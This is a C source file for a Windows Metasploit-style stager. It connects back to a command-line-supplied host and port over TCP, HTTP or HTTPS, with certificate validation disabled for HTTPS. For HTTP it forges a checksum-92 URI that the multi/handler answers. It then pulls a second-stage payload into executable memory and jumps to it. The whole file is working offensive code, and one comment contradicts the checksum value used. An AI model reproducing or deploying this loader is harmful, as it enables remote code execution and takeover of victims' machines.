#include <WinSock2.h>
#include <Windows.h>
#include <Wininet.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "wininet.lib")

// Globals ...
unsigned long uIP;
unsigned short sPORT;
unsigned char *buf;
unsigned int bufSize;


// Functions ...
void gen_random(char *s, const int len) { // ripped from http://stackoverflow.com/questions/440133/how-do-i-create-a-random-alpha-numeric-string-in-c
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < len; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum)-1)];
	}

	s[len] = 0;
}

int TextChecksum8(char* text)
{
	UINT temp = 0;
	for (UINT i = 0; i < strlen(text); i++)
	{
		temp += (int)text[i];
	}
	return temp % 0x100;
}

unsigned char* rev_tcp(char* host, char* port)
{

	WSADATA wsaData;
	SOCKET sckt;
	struct sockaddr_in server;
	hostent *hostName;
	int length = 0;

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0){
		exit(1);
	}

	hostName = gethostbyname(host);

	if (hostName == nullptr){
		exit(2);
	}

	uIP = *(unsigned long*)hostName->h_addr_list[0];
	sPORT = htons(atoi(port));

	server.sin_addr.S_un.S_addr = uIP;
	server.sin_family = AF_INET;
	server.sin_port = sPORT;

	sckt = socket(AF_INET, SOCK_STREAM, NULL);
	if (sckt == INVALID_SOCKET){
		exit(3);
	}

	if (connect(sckt, (sockaddr*)&server, sizeof(server)) != 0){
		exit(4);
	}

	recv(sckt, (char*)&bufSize, 4, 0);

	buf = (unsigned char*)VirtualAlloc(buf, bufSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	buf[0] = 0xbf;
	strncpy((char*)buf + 1, (const char*)&sckt, 4);

	length = bufSize;
	int location = 0;
	while (length != 0){
		int received = 0;

		received = recv(sckt, ((char*)(buf + 5 + location)), length, 0);

		location = location + received;
		length = length - received;
	}

	return buf;
}

unsigned char* rev_http(char* host, char* port, bool WithSSL){
	// Steps:
	//	1) Calculate a random URI->URL with `valid` checksum; that is needed for the multi/handler to distinguish and identify various framework related requests "i.e. coming from stagers" ... we'll be asking for checksum==92 "INITM", which will get the patched stage in return. 
	//	2) Decide about whether we're reverse_http or reverse_https, and set flags appropriately.
	//	3) Prepare buffer for the stage with WinInet: InternetOpen, InternetConnect, HttpOpenRequest, HttpSendRequest, InternetReadFile.
	//	4) Return pointer to the populated buffer to caller function.
	//***************************************************************//
	
	// Variables
	char URI[5] = { 0 };			//4 chars ... it can be any length actually.
	char FullURL[6] = { 0 };	// FullURL
	unsigned char* buffer = nullptr;
	DWORD flags = 0;
	int dwSecFlags = 0;

	//	Step 1: Calculate a random URI->URL with `valid` checksum; that is needed for the multi/handler to distinguish and identify various framework related requests "i.e. coming from stagers" ... we'll be asking for checksum==92 "INITM", which will get the patched stage in return. 
	int checksum = 0;
	srand(GetTickCount());
	while (true)				//Keep getting random values till we succeed, don't worry, computers are pretty fast and we're not asking for much.
	{
		gen_random(URI, 4);				//Generate a 4 char long random string ... it could be any length actually, but 4 sounds just fine.
		checksum = TextChecksum8(URI);	//Get the 8-bit checksum of the random value
		if (checksum == 92)		//If the checksum == 92, it will be handled by the multi/handler correctly as a "INITM" and will send over the stage.
		{
			break; // We found a random string that checksums to 98
		}
	}
	strcpy(FullURL, "/");
	strcat(FullURL, URI);

	//	2) Decide about whether we're reverse_http or reverse_https, and set flags appropriately.
	if (WithSSL) {
		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA);
	}
	else {
		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI);
	}

	//	3) Prepare buffer for the stage with WinInet:
	//	   InternetOpen, InternetConnect, HttpOpenRequest, HttpSendRequest, InternetReadFile.

	//	3.1: HINTERNET InternetOpen(_In_  LPCTSTR lpszAgent, _In_  DWORD dwAccessType, _In_  LPCTSTR lpszProxyName, _In_  LPCTSTR lpszProxyBypass, _In_  DWORD dwFlags);
	HINTERNET hInternetOpen = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);;
	if (hInternetOpen == NULL){
		exit(201);
	}

	// 3.2: InternetConnect
	HINTERNET hInternetConnect = InternetConnect(hInternetOpen, host, atoi(port), NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	if (hInternetConnect == NULL){
		exit(202);
	}

	// 3.3: HttpOpenRequest
	HINTERNET hHTTPOpenRequest = HttpOpenRequest(hInternetConnect, "GET", FullURL, NULL, NULL, NULL, flags, NULL);
	if (hHTTPOpenRequest == NULL){
		exit(203);
	}

	// 3.4: if (SSL)->InternetSetOption 
	if (WithSSL){
		dwSecFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
		InternetSetOption(hHTTPOpenRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));
	}

	// 3.5: HttpSendRequest 
	if (!HttpSendRequest(hHTTPOpenRequest, NULL, NULL, NULL, NULL))
	{
		exit(204);
	}

	// 3.6: VirtualAlloc enough memory for the stage ... 4MB are more than enough
	buffer = (unsigned char*)VirtualAlloc(NULL, (4 * 1024 * 1024), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// 3.7: InternetReadFile: keep reading till nothing is left.

	BOOL bKeepReading = true;
	DWORD dwBytesRead = -1;
	DWORD dwBytesWritten = 0;
	while (bKeepReading && dwBytesRead != 0)
	{
		bKeepReading = InternetReadFile(hHTTPOpenRequest, (buffer + dwBytesWritten), 4096, &dwBytesRead);
		dwBytesWritten += dwBytesRead;
	}

	//	4) Return pointer to the populated buffer to caller function.
	return buffer;
}

char* WcharToChar(wchar_t* orig){
	size_t convertedChars = 0;
	size_t origsize = wcslen(orig) + 1;
	const size_t newsize = origsize * 2;
	char *nstring = (char*)VirtualAlloc(NULL, newsize, MEM_COMMIT, PAGE_READWRITE);
	wcstombs(nstring, orig, origsize);
	return nstring;
}



// not needed anymore ... kept for future reference :)
//wchar_t* CharToWchar(char* orig){
//	size_t newsize = strlen(orig) + 1;
//	wchar_t * wcstring = (wchar_t*)VirtualAlloc(NULL, newsize, MEM_COMMIT, PAGE_READWRITE);
//	mbstowcs(wcstring, orig, newsize);
//	return wcstring;
//}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int CmdShow)
{
	LPWSTR *szArglist;
	int nArgs;

	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);

	// rudimentary error checking
	if (NULL == szArglist) { // problem parsing?
		exit(100);
	}
	else if (nArgs != 4){ // less than 4 args?
		exit(101);
	}

	// convert wchar_t to mb
	char* TRANSPORT	= WcharToChar(szArglist[1]);
	char* LHOST = WcharToChar(szArglist[2]);
	char* LPORT = WcharToChar(szArglist[3]);

	// pick transport ...
	switch (TRANSPORT[0]) {
	case '0':
		buf = rev_tcp(LHOST, LPORT);
		break;
	case '1':
		buf = rev_http(LHOST, LPORT, FALSE);
		break;
	case '2':
		buf = rev_http(LHOST, LPORT, TRUE);
		break;
	default:
		exit(102); // transport is not 0,1 or 2
	}


	(*(void(*)())buf)();
	exit(0);
}

